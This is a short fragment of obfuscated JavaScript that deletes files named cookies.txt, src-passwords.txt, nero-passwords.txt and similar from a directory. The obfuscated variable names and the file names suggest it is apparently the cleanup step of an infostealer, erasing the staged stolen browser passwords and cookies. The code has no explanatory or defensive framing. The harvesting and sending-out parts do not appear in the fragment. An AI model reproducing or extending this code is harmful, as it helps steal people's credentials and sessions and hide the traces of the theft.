  a0_0x3d690d.unlinkSync(a0_0x1a05d2 + '\\cookies.txt')
  a0_0x3d690d.unlinkSync(a0_0x1a05d2 + '\\src-passwords.txt')
  a0_0x3d690d.unlinkSync(a0_0x1a05d2 + '\\src-cookies.txt')
  a0_0x3d690d.unlinkSync(a0_0x1a05d2 + '\\nero-passwords.txt')
  a0_0x3d690d.unlinkSync(a0_0x1a05d2 + '\\nero-cookies.txt')
}
